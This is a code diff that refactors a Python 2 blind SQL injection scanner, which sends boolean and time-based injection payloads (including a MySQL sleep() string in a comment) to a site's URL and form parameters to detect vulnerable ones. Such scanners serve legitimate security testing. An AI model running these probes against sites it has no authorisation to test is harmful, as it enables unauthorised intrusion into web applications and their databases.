@@ -1,11 +1,8 @@
-from utils import add_url_params, change_url_params, get_url_host, get_form_params, compare, POST, GET
+from utils import update_url_params, request_params, get_url_host, get_url_query, get_form_params, compare, POST, GET
 from urlparse import urlparse, urljoin, parse_qsl
 from client import NotAPage, RedirectedToExternal
 
 import copy
-import time
-
-
 
 #(select(0)from(select(sleep({0})))v)/*'+(select(0)from(select(sleep({0})))v)+'\"+(select(0)from(select(sleep({0})))v)+\"*/
 TIME_INJECTIONS = {
@@ -47,18 +44,15 @@ def sql_blind(page, client):
 
 def boolean_blind(client, page):
     page_content = list(page.document.stripped_strings)
-    parsed_url = urlparse(page.url)
-    url_parts = list(parsed_url)
-    query = dict(parse_qsl(url_parts[4]))
+    url = page.url
+    query = get_url_query(url)
 
     for param, value in query.iteritems():
         successed = 0
         for payload, is_correct in BOOLEAN_INJECTIONS.iteritems():
-
-            injected_action = add_url_params(parsed_url, {param: value + payload})
-
+            injected_action = update_url_params(url, {param: value + payload})
             try:
-                res_page = client.get_req(injected_action)
+                res_page = client.get(injected_action)
                 if is_correct == compare(page_content, list(res_page.document.stripped_strings)):
                     successed += 1
             except NotAPage:
@@ -77,35 +71,30 @@ def time_based_blind(client, action, method, params=None):
     else:
         injectable, immutable = {}, {}
 
-    parsed_url = urlparse(action)
+    query = get_url_query(action)
 
-    if parsed_url.query:
-        url_parts = list(urlparse(action))
-        query = dict(parse_qsl(url_parts[4]))
+    for param, value in query.iteritems():
+        for db, injections in TIME_INJECTIONS.iteritems():
+            for inj in injections:
+                successed = []
+                for t in xrange(0, 10, 3):
+                    payload = inj.format(t)
 
-        for param, value in query.iteritems():
-            for db, injections in TIME_INJECTIONS.iteritems():
-                for inj in injections:
-                    successed = []
-                    for t in xrange(0, 10, 3):
-                        payload = inj.format(t)
+                    injected_action = update_url_params(action, {param: payload})
 
-                        injected_action = add_url_params(action, {param: payload})
+                    injected_params = copy.deepcopy(injectable)
+                    injected_params.update(immutable)
 
-                        inject = copy.deepcopy(injectable)
-                        inject.update(immutable)
+                    try:
+                        req_time = request_params(client, injected_action, method, injected_params).response.elapsed.total_seconds()
+                        successed.append([t, req_time])
+                    except NotAPage:
+                        continue
+                    except RedirectedToExternal:
+                        continue
 
-                        try:
-                            # print method, injected_action, inject
-                            req_time = request_injection(client, injected_action, method, inject).response.elapsed.total_seconds()
-                            successed.append([t, req_time])
-                        except NotAPage:
-                            continue
-                        except RedirectedToExternal:
-                            continue
-
-                    if successed and all(t <= rt for t, rt in successed):
-                        print 'SQL blind db {} in form {} param {} injection {}'.format(db, action, urlparse(action).query, payload)
+                if successed and all(t <= rt for t, rt in successed):
+                    print 'SQL blind db {} in form {} param {} injection {}'.format(db, action, urlparse(action).query, payload)
 
 
     for param in injectable.keys():
@@ -115,11 +104,11 @@ def time_based_blind(client, action, method, params=None):
                 for t in xrange(0, 10, 3):
                     payload = inj.format(t)
 
-                    inject = inject_param(injectable, param, payload)
-                    inject.update(immutable)
+                    injected_params = inject_param(injectable, param, payload)
+                    injected_params.update(immutable)
 
                     try:
-                        req_time = request_injection(client, action, method, inject).response.elapsed.total_seconds()
+                        req_time = request_params(client, action, method, injected_params).response.elapsed.total_seconds()
                         successed.append([t, req_time])
                     except NotAPage:
                         continue
@@ -134,13 +123,3 @@ def inject_param(parameters, param, injection):
     injected = copy.deepcopy(parameters)
     injected[param] = injection
     return injected
-
-def request_injection(client, url, method, inject):
-    # print method, url, inject
-    if method.lower() == POST.lower():
-        res_page = client.post_req(url, data=inject)
-    else:
-        injected_url = add_url_params(url, inject)
-        res_page = client.get_req(injected_url)
-
-    return res_page
